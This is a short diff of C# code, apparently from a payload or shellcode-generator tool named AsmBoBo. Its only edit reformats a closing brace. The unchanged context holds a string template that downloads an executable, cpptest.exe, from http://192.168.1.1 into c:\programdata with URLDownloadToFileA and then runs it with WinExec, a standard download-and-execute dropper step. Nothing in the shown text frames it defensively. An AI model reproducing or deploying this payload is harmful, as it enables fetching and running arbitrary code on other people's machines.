@@ -33,5 +33,6 @@ namespace AsmBoBo
 			"[main]                                               \n" +
 			"URLDownloadToFileA(NULL,\"http://192.168.1.1/cpptest.exe\",\"c:\\programdata\\mydir\\cpptest.exe\",0, NULL);\n" +
 			"WinExec(\"c:\\programdata\\mydir\\cpptest.exe\",1);";
-    }
+    
+	}
 }
